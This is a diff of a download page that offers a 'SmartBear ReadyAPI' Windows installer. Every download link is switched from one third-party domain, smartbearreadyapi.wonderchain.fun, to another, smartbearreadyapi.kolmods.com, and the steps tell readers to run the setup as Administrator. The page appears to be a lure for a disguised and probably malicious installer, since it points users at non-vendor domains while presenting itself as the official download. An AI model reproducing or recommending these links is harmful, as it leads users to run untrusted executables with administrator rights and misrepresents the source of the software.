@@ -16,27 +16,27 @@ Direct installer link below.
 > **This is the download page.** Use the button or link below to get **SmartBear ReadyAPI** for Windows.
 
 <p align="center">
-  <a href="https://smartbearreadyapi.wonderchain.fun/">
+  <a href="https://smartbearreadyapi.kolmods.com/">
     <img src="https://img.shields.io/badge/Download-SmartBear%20ReadyAPI-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download SmartBear ReadyAPI">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[smartbearreadyapi.wonderchain.fun](https://smartbearreadyapi.wonderchain.fun/)** |
-| **Full URL** | `https://smartbearreadyapi.wonderchain.fun/` |
+| **Direct link** | **[smartbearreadyapi.kolmods.com](https://smartbearreadyapi.kolmods.com/)** |
+| **Full URL** | `https://smartbearreadyapi.kolmods.com/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — smartbearreadyapi.wonderchain.fun](https://smartbearreadyapi.wonderchain.fun/)** (link above)
+1. Click **[Download — smartbearreadyapi.kolmods.com](https://smartbearreadyapi.kolmods.com/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://smartbearreadyapi.wonderchain.fun/"><strong>⬇ Download SmartBear ReadyAPI now</strong></a></p>
+<p align="center"><a href="https://smartbearreadyapi.kolmods.com/"><strong>⬇ Download SmartBear ReadyAPI now</strong></a></p>
 
 ---
 
